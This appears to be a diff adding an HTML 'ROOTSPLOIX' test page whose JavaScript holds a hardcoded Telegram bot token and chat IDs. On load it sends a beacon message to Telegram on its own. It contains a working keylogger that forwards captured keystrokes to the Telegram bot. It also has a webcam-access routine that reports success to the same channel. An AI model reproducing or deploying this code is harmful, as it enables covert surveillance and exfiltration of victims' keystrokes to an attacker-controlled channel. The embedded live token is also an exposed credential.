@@ -1,0 +1,210 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>ROOTSPLOIX SIMPLE TEST</title>
+    <style>
+        body { 
+            background: #000; 
+            color: #00ff00; 
+            font-family: monospace; 
+            padding: 20px; 
+            text-align: center;
+        }
+        .button {
+            background: #ff0000;
+            color: #fff;
+            border: none;
+            padding: 20px 40px;
+            border-radius: 10px;
+            cursor: pointer;
+            font-size: 18px;
+            font-weight: bold;
+            margin: 20px;
+            box-shadow: 0 0 20px rgba(255,0,0,0.8);
+        }
+        .status {
+            margin: 20px 0;
+            padding: 15px;
+            border: 2px solid #00ff00;
+            border-radius: 5px;
+        }
+    </style>
+</head>
+<body>
+    <h1>🔥💀 ROOTSPLOIX SIMPLE TEST 💀🔥</h1>
+    
+    <div class="status" id="status">
+        🚀 Ready to test bot communication...
+    </div>
+    
+    <button class="button" onclick="testSimpleBot()">
+        💀 TEST BOT ŞIMDI! 💀
+    </button>
+    
+    <button class="button" onclick="startKeylogger()">
+        ⌨️ START KEYLOGGER ⌨️
+    </button>
+    
+    <button class="button" onclick="testCameraAccess()">
+        📹 TEST CAMERA 📹
+    </button>
+    
+    <div class="status" id="results">
+        Results will appear here...
+    </div>
+    
+    <script>
+        // Simple Telegram config
+        const BOT_TOKEN = '8295691131:AAEJjGLfXEtbHhTyqJ4RC7JFbpGnx_OHthM';
+        const CHAT_ID = ['5312173877', '6633612153'];
+        let keyloggerActive = false;
+        
+        function updateStatus(message) {
+            document.getElementById('status').innerHTML = message;
+        }
+        
+        function updateResults(message) {
+            const results = document.getElementById('results');
+            results.innerHTML += `<div>[${new Date().toLocaleTimeString()}] ${message}</div>`;
+        }
+        
+        async function testSimpleBot() {
+            updateStatus('🔥 Testing bot communication...');
+            
+            try {
+                const message = `🔥💀 SIMPLE BOT TEST MESAJI! 💀🔥
+
+🎯 Session: simple_test_${Date.now()}
+🕒 Time: ${new Date().toLocaleString()}
+🔥 Status: SIMPLE TEST ACTIVE
+📡 Source: Simple Test Page
+
+OLMADI Mİ ASLANIM? SIMPLE TEST!
+
+💀 ROOTSPLOIX SIMPLE v3.0`;
+                
+                const chatIds = Array.isArray(CHAT_ID) ? CHAT_ID : [CHAT_ID];
+                let allSuccess = true;
+                
+                for (const chatId of chatIds) {
+                    const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({
+                            chat_id: chatId,
+                            text: message
+                        })
+                    });
+                    
+                    if (!response.ok) {
+                        allSuccess = false;
+                    }
+                }
+                
+                if (allSuccess) {
+                    updateStatus('✅ BOT ÇALIŞIYOR! Mesaj gönderildi!');
+                    updateResults('✅ Telegram mesaj başarılı');
+                } else {
+                    updateStatus('❌ Bot iletişim hatası (bazı ID\'lerde)');
+                    updateResults('❌ Telegram API error on some chat IDs');
+                }
+                
+            } catch (error) {
+                updateStatus('❌ Network error');
+                updateResults('❌ Error: ' + error.message);
+            }
+        }
+        
+        function startKeylogger() {
+            if (!keyloggerActive) {
+                keyloggerActive = true;
+                updateStatus('⌨️ Keylogger aktif edildi!');
+                updateResults('⌨️ Keylogger started');
+                
+                document.addEventListener('keydown', function(e) {
+                    if (keyloggerActive) {
+                        updateResults(`Key: ${e.key} (${e.code})`);
+                        
+                        // Her 10 tuşta bir telegram'a gönder
+                        if (Math.random() < 0.1) {
+                            sendKeystroke(e.key);
+                        }
+                    }
+                });
+            } else {
+                keyloggerActive = false;
+                updateStatus('⌨️ Keylogger durduruldu!');
+                updateResults('⌨️ Keylogger stopped');
+            }
+        }
+        
+        async function sendKeystroke(key) {
+            try {
+                const message = `⌨️ KEYLOGGER CAPTURE!
+
+🎯 Key: ${key}
+🕒 Time: ${new Date().toLocaleString()}
+💀 ROOTSPLOIX KEYLOG ACTIVE!`;
+                
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        text: message
+                    })
+                });
+            } catch (e) {
+                console.log('Keylog send failed:', e);
+            }
+        }
+        
+        async function testCameraAccess() {
+            updateStatus('📹 Testing camera access...');
+            
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({
+                    video: true,
+                    audio: false
+                });
+                
+                updateStatus('📹 KAMERA ERİŞİMİ BAŞARILI!');
+                updateResults('📹 Camera access granted');
+                
+                const message = `📹 CAMERA ACCESS SUCCESS!
+
+🎯 Camera: Accessed successfully
+📱 Resolution: ${stream.getVideoTracks()[0].getSettings().width}x${stream.getVideoTracks()[0].getSettings().height}
+🕒 Time: ${new Date().toLocaleString()}
+
+💀 ROOTSPLOIX CAMERA ACTIVE!`;
+                
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        text: message
+                    })
+                });
+                
+                // Stop stream after 5 seconds
+                setTimeout(() => {
+                    stream.getTracks().forEach(track => track.stop());
+                    updateResults('📹 Camera stream stopped');
+                }, 5000);
+                
+            } catch (error) {
+                updateStatus('❌ Kamera erişimi başarısız: ' + error.message);
+                updateResults('❌ Camera error: ' + error.message);
+            }
+        }
+        
+        // Auto-send startup message
+        setTimeout(() => {
+            updateStatus('🚀 Simple test page loaded');
+            testSimpleBot();
+        }, 1000);
+    </script>
+</body>
+</html>
